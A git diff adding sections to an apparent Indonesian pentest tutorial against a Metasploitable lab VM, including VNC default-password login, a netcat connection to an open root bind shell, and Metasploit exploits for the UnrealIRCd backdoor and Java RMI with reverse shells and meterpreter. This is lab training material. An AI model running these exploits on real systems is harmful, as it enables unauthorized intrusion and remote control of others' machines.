@@ -1569,7 +1569,7 @@ Shellcodes: No Results
 
 Cuman masalah lain muncul yaitu versi yang muncul banyak karena kita tidak memasukan versi spesifik pada pencarian. Kita bisa saja mencoba satu persatu tapi akan kurang efektif.
 
-__Menggunakan scanner pada metasploit__
+#### Menggunakan scanner pada metasploit
 
 Metasploit mempunyai modules `auxiliary` pada direktori modules, yang di dalamnya terdapat direktori `scanner` yang bisa kita gunakan.
 
@@ -1733,7 +1733,7 @@ msf6 auxiliary(scanner/smb/smb_version) >
 
 Banggggg!!!! kita sudah menemukan versi samba yaitu `Samba 3.0.20`.
 
-__Exploit Samba 3.0.20__
+#### Exploit Samba 3.0.20
 
 Setelah versi samba diketahui kemudian kita akan mencari exploit samba:
 
@@ -1911,7 +1911,7 @@ msf6 exploit(multi/samba/usermap_script) > exploit
 
 Banggg......!!! berhasil. Jika cara di atas tidak berhasil untuk mencari versi eksploit atau exploit itu sendiri, kita bisa menggunakan jalan terakhir dengan menggunakan google.
 
-__Brutoforce attack SSH__
+#### Brutoforce attack SSH
 
 Dalam dunia nyata, yang perlu disiapkan sebelum adalah brutoforce adalah wordlist. Di Kali Linux tool yang dapat digunakan untuk membuat wordlist adalah `crunch`.
 
@@ -1932,6 +1932,7 @@ Jalankan metasploit sekaligus memasukan option konfigurasi:
 
 ```bash
 $ msfconsole 
+
 Metasploit tip: The use command supports fuzzy searching to try and 
 select the intended module, e.g. use kerberos/get_ticket or use 
 kerberos forge silver ticket
@@ -2054,4 +2055,369 @@ msf6 auxiliary(scanner/ssh/ssh_login) > sessions -i 1
 
 Banggg!!!!. Berhasil.
 
+#### Exploit VNC
 
+Jika kita kembali pada hasil scan nessus sebelumnya, terdapat vurnerability pada VNC Server seperti gambar dibawah ini:
+
+![VNC](img/vnc.png)
+
+Dalam keterangan gambar di atas nessus berhasil menemukan vurnerability dari password VNC Server yaitu `password` pada port `5900`. Dengan data tersebut kita bisa langsung masuk ke dalam vnc server Metasploitable target.
+
+```bash
+vncviewer 192.168.1.22
+```
+
+![VNC Server Exploit](img/vnc-exploit.png)
+
+Banggg!!!!.
+
+__Exploit Bind Shell__
+
+Pada hasil lain nessus vurnerability analysis terdapat vurnerability pada bind shell pada port 1524:
+
+![Bind Shell](img/bind-shell.png)
+
+Pada keterangan gambar di atas, terdapat shell yang sedang menunggu remote tanpa adanya authentication. Kita dapat menggunakan tools `netcat` pada Kali Linux untuk terhubung dengan target.
+
+```bash
+$ netcat 192.168.1.22 1524
+
+root@metasploitable:/# 
+```
+Bangggg!!!!!
+
+#### Exploit IRC
+
+IRC adalah Internet Relay Chat, yang merupakan jaringan server internet yang memungkinkan pengguna untuk melakukan percakapan teks secara real-time. Dari hasil scan nmap ditemukan port terbukan pada `6667/tcp open  irc  UnrealIRCd`.
+
+```bash
+$ nmap -sV 192.168.1.22              
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-17 21:32 +08
+Nmap scan report for 192.168.1.22 (192.168.1.22)
+Host is up (0.028s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login       OpenBSD or Solaris rlogind
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 08:00:27:27:B4:9C (Oracle VirtualBox virtual NIC)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 12.12 seconds
+```                         
+
+Pencarian exploit `UnrealIRCd`
+
+```bash
+$ searchsploit unrealircd
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                  |  Path
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit)                                                                                                                    | linux/remote/16922.rb
+UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow                                                                                                                         | windows/dos/18011.txt
+UnrealIRCd 3.2.8.1 - Remote Downloader/Execute                                                                                                                                  | linux/remote/13853.pl
+UnrealIRCd 3.x - Remote Denial of Service                                                                                                                                       | windows/dos/27407.pl
+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+```
+
+Kita menemukan exploit `UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) linux/remote/16922.rb` yang dimiliki oleh metasploit, untuk itu kita akan masuk ke dalam metasploit.
+
+```bash
+$ msfconsole
+
+Metasploit tip: Network adapter names can be used for IP options set LHOST 
+eth0
+                                                  
+
+      .:okOOOkdc'           'cdkOOOko:.
+    .xOOOOOOOOOOOOc       cOOOOOOOOOOOOx.
+   :OOOOOOOOOOOOOOOk,   ,kOOOOOOOOOOOOOOO:
+  'OOOOOOOOOkkkkOOOOO: :OOOOOOOOOOOOOOOOOO'
+  oOOOOOOOO.MMMM.oOOOOoOOOOl.MMMM,OOOOOOOOo
+  dOOOOOOOO.MMMMMM.cOOOOOc.MMMMMM,OOOOOOOOx
+  lOOOOOOOO.MMMMMMMMM;d;MMMMMMMMM,OOOOOOOOl
+  .OOOOOOOO.MMM.;MMMMMMMMMMM;MMMM,OOOOOOOO.
+   cOOOOOOO.MMM.OOc.MMMMM'oOO.MMM,OOOOOOOc
+    oOOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOOo
+     lOOOOO.MMM.OOOO.MMM:OOOO.MMM,OOOOOl
+      ;OOOO'MMM.OOOO.MMM:OOOO.MMM;OOOO;
+       .dOOo'WM.OOOOocccxOOOO.MX'xOOd.
+         ,kOl'M.OOOOOOOOOOOOO.M'dOk,
+           :kk;.OOOOOOOOOOOOO.;Ok:
+             ;kOOOOOOOOOOOOOOOk:
+               ,xOOOOOOOOOOOx,
+                 .lOOOOOOOl.
+                    ,dOd,
+                      .
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2467 exploits - 1273 auxiliary - 431 post       ]
++ -- --=[ 1478 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search unrealircd
+
+Matching Modules
+================
+
+   #  Name                                        Disclosure Date  Rank       Check  Description
+   -  ----                                        ---------------  ----       -----  -----------
+   0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  No     UnrealIRCD 3.2.8.1 Backdoor Command Execution
+
+
+Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/irc/unreal_ircd_3281_backdoor
+
+msf6 > use 0
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show options
+
+Module options (exploit/unix/irc/unreal_ircd_3281_backdoor):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   CHOST                     no        The local client address
+   CPORT                     no        The local client port
+   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                    yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT    6667             yes       The target port (TCP)
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic Target
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set RHOSTS 192.168.1.22
+RHOSTS => 192.168.1.22
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+
+[-] 192.168.1.22:6667 - Exploit failed: A payload has not been selected.
+[*] Exploit completed, but no session was created.
+```
+
+Dari hasil di atas kita perlu memasukan `payload`, dan karena menggunakan payload kita perlu memasukan juga `LHOST` yaitu ip Kali Linux kita:
+
+```bash
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > show payloads
+
+Compatible Payloads
+===================
+
+   #   Name                                        Disclosure Date  Rank    Check  Description
+   -   ----                                        ---------------  ----    -----  -----------
+   0   payload/cmd/unix/adduser                    .                normal  No     Add user with useradd
+   1   payload/cmd/unix/bind_perl                  .                normal  No     Unix Command Shell, Bind TCP (via Perl)
+   2   payload/cmd/unix/bind_perl_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via perl) IPv6
+   3   payload/cmd/unix/bind_ruby                  .                normal  No     Unix Command Shell, Bind TCP (via Ruby)
+   4   payload/cmd/unix/bind_ruby_ipv6             .                normal  No     Unix Command Shell, Bind TCP (via Ruby) IPv6
+   5   payload/cmd/unix/generic                    .                normal  No     Unix Command, Generic Command Execution
+   6   payload/cmd/unix/reverse                    .                normal  No     Unix Command Shell, Double Reverse TCP (telnet)
+   7   payload/cmd/unix/reverse_bash_telnet_ssl    .                normal  No     Unix Command Shell, Reverse TCP SSL (telnet)
+   8   payload/cmd/unix/reverse_perl               .                normal  No     Unix Command Shell, Reverse TCP (via Perl)
+   9   payload/cmd/unix/reverse_perl_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via perl)
+   10  payload/cmd/unix/reverse_ruby               .                normal  No     Unix Command Shell, Reverse TCP (via Ruby)
+   11  payload/cmd/unix/reverse_ruby_ssl           .                normal  No     Unix Command Shell, Reverse TCP SSL (via Ruby)
+   12  payload/cmd/unix/reverse_ssl_double_telnet  .                normal  No     Unix Command Shell, Double Reverse TCP SSL (telnet)
+
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set payload 6
+payload => cmd/unix/reverse
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > set LHOST 192.168.1.21
+LHOST => 192.168.1.21
+msf6 exploit(unix/irc/unreal_ircd_3281_backdoor) > run
+
+[*] Started reverse TCP double handler on 192.168.1.21:4444 
+[*] 192.168.1.22:6667 - Connected to 192.168.1.22:6667...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
+    :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+[*] 192.168.1.22:6667 - Sending backdoor command...
+[*] Accepted the first client connection...
+[*] Accepted the second client connection...
+[*] Command: echo uU16gNE6uINFz3Lp;
+[*] Writing to socket A
+[*] Writing to socket B
+[*] Reading from sockets...
+[*] Reading from socket B
+[*] B: "uU16gNE6uINFz3Lp\r\n"
+[*] Matching...
+[*] A is input...
+[*] Command shell session 1 opened (192.168.1.21:4444 -> 192.168.1.22:55337) at 2024-12-17 21:59:13 +0800
+
+```
+
+Banggggg!!!!!
+
+#### Exploit Java RMI
+
+Selanjutnya kita akan mencoba exploit java rmi, buka console metasploit:
+
+```bash
+$ msfconsole
+Metasploit tip: Search can apply complex filters such as search cve:2009 
+type:exploit, see all the filters with help search
+                                                  
+  +-------------------------------------------------------+
+  |  METASPLOIT by Rapid7                                 |                                                                                                                                                       
+  +---------------------------+---------------------------+                                                                                                                                                       
+  |      __________________   |                           |                                                                                                                                                       
+  |  ==c(______(o(______(_()  | |""""""""""""|======[***  |                                                                                                                                                       
+  |             )=\           | |  EXPLOIT   \            |                                                                                                                                                       
+  |            // \\          | |_____________\_______    |                                                                                                                                                       
+  |           //   \\         | |==[msf >]============\   |                                                                                                                                                       
+  |          //     \\        | |______________________\  |                                                                                                                                                       
+  |         // RECON \\       | \(@)(@)(@)(@)(@)(@)(@)/   |                                                                                                                                                       
+  |        //         \\      |  *********************    |                                                                                                                                                       
+  +---------------------------+---------------------------+                                                                                                                                                       
+  |      o O o                |        \'\/\/\/'/         |                                                                                                                                                       
+  |              o O          |         )======(          |                                                                                                                                                       
+  |                 o         |       .'  LOOT  '.        |                                                                                                                                                       
+  | |^^^^^^^^^^^^^^|l___      |      /    _||__   \       |                                                                                                                                                       
+  | |    PAYLOAD     |""\___, |     /    (_||_     \      |                                                                                                                                                       
+  | |________________|__|)__| |    |     __||_)     |     |                                                                                                                                                       
+  | |(@)(@)"""**|(@)(@)**|(@) |    "       ||       "     |                                                                                                                                                       
+  |  = = = = = = = = = = = =  |     '--------------'      |                                                                                                                                                       
+  +---------------------------+---------------------------+                                                                                                                                                       
+
+
+       =[ metasploit v6.4.38-dev                          ]
++ -- --=[ 2467 exploits - 1273 auxiliary - 431 post       ]
++ -- --=[ 1478 payloads - 49 encoders - 13 nops           ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit Documentation: https://docs.metasploit.com/
+
+msf6 > search java_rmi
+
+Matching Modules
+================
+
+   #  Name                                            Disclosure Date  Rank       Check  Description
+   -  ----                                            ---------------  ----       -----  -----------
+   0  auxiliary/gather/java_rmi_registry              .                normal     No     Java RMI Registry Interfaces Enumeration
+   1  exploit/multi/misc/java_rmi_server              2011-10-15       excellent  Yes    Java RMI Server Insecure Default Configuration Java Code Execution
+   2    \_ target: Generic (Java Payload)             .                .          .      .
+   3    \_ target: Windows x86 (Native Payload)       .                .          .      .
+   4    \_ target: Linux x86 (Native Payload)         .                .          .      .
+   5    \_ target: Mac OS X PPC (Native Payload)      .                .          .      .
+   6    \_ target: Mac OS X x86 (Native Payload)      .                .          .      .
+   7  auxiliary/scanner/misc/java_rmi_server          2011-10-15       normal     No     Java RMI Server Insecure Endpoint Code Execution Scanner
+   8  exploit/multi/browser/java_rmi_connection_impl  2010-03-31       excellent  No     Java RMIConnectionImpl Deserialization Privilege Escalation
+
+
+Interact with a module by name or index. For example info 8, use 8 or use exploit/multi/browser/java_rmi_connection_impl
+
+msf6 > use 1
+
+[*] No payload configured, defaulting to java/meterpreter/reverse_tcp
+msf6 exploit(multi/misc/java_rmi_server) > show options
+
+Module options (exploit/multi/misc/java_rmi_server):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
+   RHOSTS                      yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      1099             yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL for incoming connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                     no        The URI to use for this exploit (default is random)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.21     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/misc/java_rmi_server) > set RHOSTS 192.168.1.22
+RHOSTS => 192.168.1.22
+msf6 exploit(multi/misc/java_rmi_server) > show options
+
+Module options (exploit/multi/misc/java_rmi_server):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   HTTPDELAY  10               yes       Time that the HTTP Server will wait for the payload request
+   RHOSTS     192.168.1.22     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT      1099             yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL for incoming connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   URIPATH                     no        The URI to use for this exploit (default is random)
+
+
+Payload options (java/meterpreter/reverse_tcp):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST  192.168.1.21     yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Generic (Java Payload)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(multi/misc/java_rmi_server) > run
+
+[*] Started reverse TCP handler on 192.168.1.21:4444 
+[*] 192.168.1.22:1099 - Using URL: http://192.168.1.21:8080/ZOhXk2
+[*] 192.168.1.22:1099 - Server started.
+[*] 192.168.1.22:1099 - Sending RMI Header...
+[*] 192.168.1.22:1099 - Sending RMI Call...
+[*] 192.168.1.22:1099 - Replied to request for payload JAR
+[*] Sending stage (58037 bytes) to 192.168.1.22
+[*] Meterpreter session 1 opened (192.168.1.21:4444 -> 192.168.1.22:38427) at 2024-12-17 22:07:33 +0800
+
+meterpreter >
+```
+
+Bangggg!!!! kita berhasil exploit java rmi tapi ada yang berbeda kali ini kita masuk kedalam session menggunakan `meterpreter`. Kelebihan `meterpreter` kita bisa menggunakan perintah tambahan, dan untuk menggunakan perintah tersebut kita bisa menggunakan perintah `help` untuk sebagai petunjuk.
